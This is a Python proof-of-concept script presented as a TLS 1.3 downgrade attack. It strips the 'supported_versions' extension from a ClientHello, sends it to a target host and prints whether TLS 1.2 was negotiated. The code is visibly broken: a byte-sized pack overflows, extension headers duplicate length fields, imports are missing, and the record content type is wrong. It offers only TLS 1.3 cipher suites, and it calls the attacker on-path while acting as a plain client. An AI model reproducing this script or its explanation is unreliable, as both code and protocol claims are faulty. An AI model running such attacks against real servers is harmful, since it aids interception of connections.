#!/usr/bin/env python3
"""
Proof-of-Concept: Downgrade Attack via Legacy Version Negotiation

This script demonstrates how an attacker on-path can manipulate a TLS 1.3 ClientHello
by stripping the 'supported_versions' extension. This forces the server to interpret
the ClientHello as a TLS 1.2 request, potentially downgrading the connection to a
weaker protocol version if the server supports it.

RFC 8446 Section 4.1.2 states that the legacy_version field MUST be set to 0x0303 (TLS 1.2)
for TLS 1.3 ClientHellos, and version negotiation happens via the 'supported_versions' extension.
By removing this extension, a compliant server will fall back to TLS 1.2 negotiation.
"""

import sys
import struct
import socket
import random
from scapy.all import *
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

# TLS Constants
TLS_CLIENT_HELLO = 0x01
TLS_SERVER_HELLO = 0x02
TLS_CHANGE_CIPHER_SPEC = 0x14
TLS_ALERT = 0x15

TLS_VERSION_1_2 = 0x0303
TLS_VERSION_1_3 = 0x0304

# Extension Types
EXT_SUPPORTED_VERSIONS = 0x002b
EXT_KEY_SHARE = 0x0033
EXT_SIGNATURE_ALGORITHMS = 0x0013
EXT_ALPN = 0x0010
EXT_SNI = 0x0000

# Cipher Suites
TLS_AES_128_GCM_SHA256 = 0x1301
TLS_AES_256_GCM_SHA384 = 0x1302
TLS_CHACHA20_POLY1305_SHA256 = 0x1303

# Key Share Groups
GROUP_SECP256R1 = 0x0017

# Signature Algorithms
SIG_ECDSA_SECP256R1_SHA256 = 0x0403
SIG_RSA_PSS_RSAE_SHA256 = 0x0804


def build_tls_record(content, content_type):
    """Wrap content in a TLS record layer."""
    record = struct.pack('!BHH', content_type, TLS_VERSION_1_2, len(content))
    return record + content


def build_client_hello(target_host):
    """
    Build a standard TLS 1.3 ClientHello.
    According to RFC 8446, legacy_version MUST be 0x0303.
    """
    # Random 32 bytes
    random_bytes = os.urandom(32)
    
    # Session ID (32 bytes random for compatibility)
    session_id = os.urandom(32)
    
    # Cipher Suites (TLS 1.3 only)
    cipher_suites = struct.pack('!HHH', TLS_AES_128_GCM_SHA256, TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256)
    cipher_suites = struct.pack('!H', len(cipher_suites)) + cipher_suites
    
    # Compression Methods (NULL)
    compression_methods = b'\x01\x00'
    
    # Extensions
    extensions = b''
    
    # 1. Supported Versions Extension (Critical for TLS 1.3)
    supported_versions_data = struct.pack('!BB', TLS_VERSION_1_3, TLS_VERSION_1_2)
    supported_versions_ext = struct.pack('!HHH', EXT_SUPPORTED_VERSIONS, len(supported_versions_data), len(supported_versions_data)) + supported_versions_data
    extensions += supported_versions_ext
    
    # 2. Key Share Extension
    # Generate a dummy key share for secp256r1
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    public_key_bytes = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.X962,
        format=serialization.PublicFormat.UncompressedPoint
    )
    key_share_entry = struct.pack('!HH', GROUP_SECP256R1, len(public_key_bytes)) + public_key_bytes
    key_share_data = struct.pack('!H', len(key_share_entry)) + key_share_entry
    key_share_ext = struct.pack('!HHH', EXT_KEY_SHARE, len(key_share_data), len(key_share_data)) + key_share_data
    extensions += key_share_ext
    
    # 3. Signature Algorithms Extension
    sig_algs_data = struct.pack('!HH', SIG_ECDSA_SECP256R1_SHA256, SIG_RSA_PSS_RSAE_SHA256)
    sig_algs_ext = struct.pack('!HHH', EXT_SIGNATURE_ALGORITHMS, len(sig_algs_data), len(sig_algs_data)) + sig_algs_data
    extensions += sig_algs_ext
    
    # 4. SNI Extension
    sni_data = struct.pack('!BHH', 0, len(target_host)) + target_host.encode()
    sni_data = struct.pack('!H', len(sni_data)) + sni_data
    sni_ext = struct.pack('!HHH', EXT_SNI, len(sni_data), len(sni_data)) + sni_data
    extensions += sni_ext
    
    # 5. ALPN Extension (http/1.1)
    alpn_data = struct.pack('!B', 8) + b'http/1.1'
    alpn_data = struct.pack('!H', len(alpn_data)) + alpn_data
    alpn_ext = struct.pack('!HHH', EXT_ALPN, len(alpn_data), len(alpn_data)) + alpn_data
    extensions += alpn_ext
    
    # Pack extensions
    extensions = struct.pack('!H', len(extensions)) + extensions
    
    # ClientHello Structure
    client_hello = struct.pack('!H', TLS_VERSION_1_2)  # legacy_version
    client_hello += random_bytes
    client_hello += struct.pack('!B', len(session_id)) + session_id
    client_hello += cipher_suites
    client_hello += compression_methods
    client_hello += extensions
    
    return client_hello


def strip_supported_versions(client_hello_bytes):
    """
    Attacker Action: Strip the 'supported_versions' extension from the ClientHello.
    This forces the server to interpret the ClientHello as TLS 1.2.
    """
    # Parse the ClientHello to find extensions
    # Skip legacy_version (2), random (32), session_id_len (1), session_id (var), cipher_suites_len (2), cipher_suites (var), compression_methods_len (1), compression_methods (var)
    
    offset = 2 + 32  # legacy_version + random
    session_id_len = struct.unpack('!B', client_hello_bytes[offset:offset+1])[0]
    offset += 1 + session_id_len
    
    cipher_suites_len = struct.unpack('!H', client_hello_bytes[offset:offset+2])[0]
    offset += 2 + cipher_suites_len
    
    compression_methods_len = struct.unpack('!B', client_hello_bytes[offset:offset+1])[0]
    offset += 1 + compression_methods_len
    
    # Now at extensions length
    extensions_len = struct.unpack('!H', client_hello_bytes[offset:offset+2])[0]
    extensions_start = offset + 2
    extensions_end = extensions_start + extensions_len
    
    extensions_data = client_hello_bytes[extensions_start:extensions_end]
    
    # Parse extensions and remove supported_versions
    new_extensions = b''
    ext_offset = 0
    while ext_offset < len(extensions_data):
        ext_type, ext_len = struct.unpack('!HH', extensions_data[ext_offset:ext_offset+4])
        ext_data = extensions_data[ext_offset+4:ext_offset+4+ext_len]
        
        if ext_type != EXT_SUPPORTED_VERSIONS:
            new_extensions += struct.pack('!HH', ext_type, ext_len) + ext_data
        
        ext_offset += 4 + ext_len
    
    # Reconstruct ClientHello
    new_client_hello = client_hello_bytes[:extensions_start]
    new_client_hello += struct.pack('!H', len(new_extensions))
    new_client_hello += new_extensions
    
    return new_client_hello


def send_and_receive(target_ip, target_port, client_hello):
    """Send ClientHello and receive ServerHello."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        sock.connect((target_ip, target_port))
        
        # Wrap in TLS record
        tls_record = build_tls_record(client_hello, TLS_CLIENT_HELLO)
        sock.sendall(tls_record)
        
        # Receive response
        data = sock.recv(4096)
        
        # Parse TLS record
        if len(data) >= 5:
            content_type, version, length = struct.unpack('!BHH', data[:5])
            payload = data[5:5+length]
            return content_type, version, payload
        else:
            return None, None, None
            
    except Exception as e:
        print(f"Error: {e}")
        return None, None, None
    finally:
        sock.close()


def parse_server_hello(server_hello_bytes):
    """Parse ServerHello to extract negotiated version and cipher suite."""
    if len(server_hello_bytes) < 38:
        return None, None
    
    legacy_version = struct.unpack('!H', server_hello_bytes[0:2])[0]
    # Skip random (32), session_id_len (1), session_id (var)
    offset = 2 + 32
    session_id_len = struct.unpack('!B', server_hello_bytes[offset:offset+1])[0]
    offset += 1 + session_id_len
    
    cipher_suite = struct.unpack('!H', server_hello_bytes[offset:offset+2])[0]
    
    return legacy_version, cipher_suite


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    target_host = target_ip  # Use IP as SNI for simplicity
    
    print(f"[*] Target: {target_ip}:{target_port}")
    
    # Step 1: Build a standard TLS 1.3 ClientHello
    print("[+] Building standard TLS 1.3 ClientHello...")
    client_hello = build_client_hello(target_host)
    
    # Step 2: Send standard ClientHello to verify TLS 1.3 support
    print("[+] Sending standard TLS 1.3 ClientHello...")
    content_type, version, payload = send_and_receive(target_ip, target_port, client_hello)
    
    if content_type == TLS_ALERT:
        print("[!] Server sent an alert. Connection failed.")
        sys.exit(1)
    
    if content_type == TLS_SERVER_HELLO:
        legacy_version, cipher_suite = parse_server_hello(payload)
        print(f"[+] Standard ClientHello Response: Version {hex(legacy_version)}, Cipher Suite {hex(cipher_suite)}")
        
        # Check if TLS 1.3 was negotiated (look for supported_versions extension in ServerHello)
        # For simplicity, we assume if legacy_version is 0x0303 and we sent TLS 1.3, it might be TLS 1.3
        # A proper check would parse the extensions
    
    # Step 3: Attacker Action - Strip supported_versions extension
    print("[+] Attacker: Stripping 'supported_versions' extension...")
    modified_client_hello = strip_supported_versions(client_hello)
    
    # Step 4: Send modified ClientHello
    print("[+] Sending modified ClientHello (downgrade attempt)...")
    content_type, version, payload = send_and_receive(target_ip, target_port, modified_client_hello)
    
    if content_type == TLS_ALERT:
        print("[!] Server sent an alert. Downgrade attempt failed or detected.")
        sys.exit(1)
    
    if content_type == TLS_SERVER_HELLO:
        legacy_version, cipher_suite = parse_server_hello(payload)
        print(f"[+] Modified ClientHello Response: Version {hex(legacy_version)}, Cipher Suite {hex(cipher_suite)}")
        
        if legacy_version == TLS_VERSION_1_2:
            print("[+] SUCCESS: Server negotiated TLS 1.2. Downgrade attack successful!")
            print("[+] The connection is now using TLS 1.2, which may have weaker security properties.")
        else:
            print("[+] Server negotiated a different version. Downgrade may not have occurred.")
    else:
        print("[!] Unexpected response from server.")


if __name__ == "__main__":
    main()
